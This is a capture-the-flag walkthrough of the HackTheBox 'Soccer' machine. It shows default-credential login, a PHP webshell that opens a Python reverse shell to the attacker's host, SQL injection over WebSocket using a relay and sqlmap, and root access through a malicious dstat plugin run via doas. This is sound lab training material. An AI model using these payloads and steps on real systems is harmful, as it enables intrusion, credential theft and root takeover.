# Soccer

## Overview

A Linux machine, created by [sau123](https://app.hackthebox.com/users/201596), features

* Default credential vulnerability
* File uploading vulnerability
* SQL injection with Websocket
* `dstat` plugins

on the HackTheBox platform.

{% embed url="https://app.hackthebox.com/machines/Soccer" %}

## Reconnaissance

### Port Scanning

The port scanning reveals that ports 22, 80, and 9091 are opened on the target.

```bash
$ sudo nmap -Pn -n -sS -p- -T4 --min-rate 1000 -v <IP>
```

### Hostname

We see the virtual host name in the HTTP response and we add it to our hosts file `/etc/hosts`.

```bash
$ curl -i http://<IP>
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 12 Jun 2023 09:45:49 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://soccer.htb/

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
```

No more hostnames can be found further via the command `ffuf`:

{% code overflow="wrap" %}
```bash
$ ffuf -u http://<IP> -H 'Host: FUZZ.soccer.htb' -w path_to_subdomains-top1million-5000.txt -fs 178
```
{% endcode %}

### Web URL Path

We found a URL path `/tiny/` via the command `ffuf`:

```bash
$ ffuf -u http://soccer.htb/FUZZ -w path_to_raft-medium-words.txt -e /
...
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
tiny/                   [Status: 200, Size: 11521, Words: 3512, Lines: 97, Duration: 35ms]
...
```

### Tiny File Manager

The URL path `/tiny/` leads us to the login page of a _Tiny File Manager_ service.

<figure><figcaption></figcaption></figure>

We found the default credentials for the service in [GitHub](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management).

* admin/admin@123
* user/12345

We can then use this default credential to log into the service to manage the file uploading.

## Initial Access

### Reverse Shell

By inspecting the permissions, we see that we can upload files to the directory `/tiny/uploads`.

<figure><figcaption></figcaption></figure>

We then try to upload a PHP webshell with the following content to receive a revershell back by visiting the uploaded page in `/tiny/uploads/bad.php`.

{% code overflow="wrap" %}
```bash
<?php
if (isset($_GET['bad']))
  system("python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('<OUR_IP>',4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn('/bin/bash')\"");
?>
```
{% endcode %}

### Another vHost

As we see in the HTTP response earlier, the site is built on Nginx. So the thing next to do when we got a reverse shell is to inspect the related configurations in `/etc/nginx/`.

We found another site `soc-player.soccer.htb` is enabled on the host.

```bash
www-data@soccer:/etc/nginx/sites-enabled$ ls -F
default@  soc-player.htb@
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}

```

The new vhost leads us to another site where we can view the game match, register a new user, or log in to view the tickets for the game match.

We see that the site will use WebSocket to communicate with the server.

<figure><figcaption></figcaption></figure>

By inspecting the source code, we see that the established WebSocket sends messages encoded in JSON  `{"id": "<message>"}`:

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
window.onload = function () {
        
    var btn = document.getElementById('btn');
    var input = document.getElementById('id');
        
    ws.onopen = function (e) {
        console.log('connected to the server')
    }
    input.addEventListener('keypress', (e) => {
        keyOne(e)
    });
        
    function keyOne(e) {
        e.stopPropagation();
        if (e.keyCode === 13) {
            e.preventDefault();
            sendText();
        }
    }
        
    function sendText() {
        var msg = input.value;
        if (msg.length > 0) {
            ws.send(JSON.stringify({
                "id": msg
            }))
        }
        else append("????????")
    }
}
        
ws.onmessage = function (e) {
    append(e.data)
}
        
function append(msg) {
    let p = document.querySelector("p");
    // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
    // p.style.color = randomColor;
    p.textContent = msg
}
```

### SQL Injection

To test if any SQL injection vulnerability can be exploited via the WebSocket message automatically, we simply set up an Express app that will pass the received parameters to the target `ws://soc-player.soccer.htb:9091` through WebSocket:

{% code lineNumbers="true" %}
```javascript
const express = require('express');
const app = express();
const port = 3000;

const { WebSocket } = require('ws');

app.get('/', (req, res) => {
    const ws = new WebSocket('ws://soc-player.soccer.htb:9091');
    msg = JSON.stringify(req.query);
    console.log(msg);
    ws.on('open', function open() {
          ws.send(msg);
    });
    ws.on('message', function message(data) {
        console.log('received: %s', data);
        res.send(data);
    });
})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
})

```
{% endcode %}

We can then use `sqlmap` to test if SQL injection vulnerability exists.

```bash
$ sqlmap http://localhost:3000/?id=123
...
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=3500 AND (SELECT 1021 FROM (SELECT(SLEEP(5)))rWmV)
...
```

We dump the databases and find a databae `soccer_db` exists.

```bash
$ sqlmap http://localhost:3000/?id=123 --dbs
...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
...
```

We can further get the table names.

```bash
$ sqlmap http://localhost:3000/?id=123 -D soccer_db --tables
...
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
...
```

We can then dump the table `accounts`.

```bash
$ sqlmap -u http://localhost:3000/?id=123 -D soccer_db -T accounts --columns
$ sqlmap -u http://localhost:3000/?id=123 -D soccer_db -T accounts --dump
...
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
...
```

We can log in as user `player` to the target with the credential `PlayerOftheMatch2022` using SSH and get the user flag now.

> `sqlmap` support WebSocket scheme in the [pull request 1206](https://github.com/sqlmapproject/sqlmap/pull/1206).
>
> We can directly use it to test SQL injection vulnerability like the following command:
>
> ```bash
> $ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --
> level 5 --risk 3 --batch
> ```

## Privilege Escalation

We can't run `sudo` on the localhost.

```bash
player@soccer:~$ sudo -l
[sudo] password for player:
Sorry, user player may not run sudo on localhost.
```

### SUID Program

We found a SUID program `doas` using `find`.

```bash
$ player@soccer:~$ find / -perm -4000 -type f 2> /dev/null
/usr/local/bin/doas
...
```

{% embed url="https://wiki.archlinux.org/title/Doas" %}

By reviewing the related configuration `/usr/local/etc/doas.conf`, we see that the user `player` can run the Python script `/usr/bin/dstat`, _a versatile tool for generating system resource statistics_.

```bash
$ player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

### dstat Plugin

User can add `dstat` plugin in a couple of places:

```bash
player@soccer:~$ man stat
...
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/
...
```

One of the directory can be written.

```bash
ls -l 
```

The plugins are written in Python script.

```bash
player@soccer:~$ ls /usr/share/dstat/
__pycache__              dstat_fan.py            dstat_mongodb_opcount.py      dstat_nfsd4_ops.py     dstat_snooze.py           dstat_top_oom.py
dstat.py                 dstat_freespace.py      dstat_mongodb_queue.py        dstat_nfsstat4.py      dstat_squid.py            dstat_utmp.py
```

We then wrote a malicious `dstat` plugin in the path `/usr/local/share/dstat`.

{% code title="/usr/local/share/dstat/dstat_rootme.py" %}
```python
import pty

pty.spawn('/bin/bash')
```
{% endcode %}

We can test if the plugin is installed via `--list` option:

```bash
player@soccer:~$ doas /usr/bin/dstat --list
internal:
        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,
        socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
...
/usr/local/share/dstat:
        rootme
```

We can invoke the plugin to get root now.

```bash
player@soccer:~$ doas /usr/bin/dstat --rootme
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
```

## Miscellaneous

### Game Match Web App

The site `soc-player.soccer.htb` is built with `express` with `ejs` template engine in the path `/root/app`.

### Ticket Server

The ticket check server is built by the Node.js packages `express` and `ws` in the script `/root/app/server.js` and we can see it clearly that the cause of the SQL injection :

```javascript
const mysql = require('mysql');
const serv = require('ws');
const express  = require('express');
const server = express().listen(9091, '0.0.0.0')
const socket = new serv.Server({ server });
const connection = mysql.createConnection({
    host : "localhost",
    user : "player",
    password : 'PlayerOftheMatch2022',
    port: 3306,
    database : "soccer_db"
})
connection.connect();
socket.on('connection', ws=> {
  ws.on('message', function incoming(data) {
    try {
      var id = JSON.parse(data).id;
    } catch (e) {
      //console.log(e);
    }
    (async () => {
          try {
            const query = `Select id,username,password  FROM accounts where id = ${id}`;
            await connection.query(query, function (error, results, fields) {
                if (error) {
                  ws.send("Ticket Doesn't Exist");
                } else {
                  if (results.length > 0) {
                    ws.send("Ticket Exists")
                  } else {
                    ws.send("Ticket Doesn't Exist")
                  }
                }
              });
          } catch (error) {
            ws.send("Error");
          }
      })()
   });
});
```
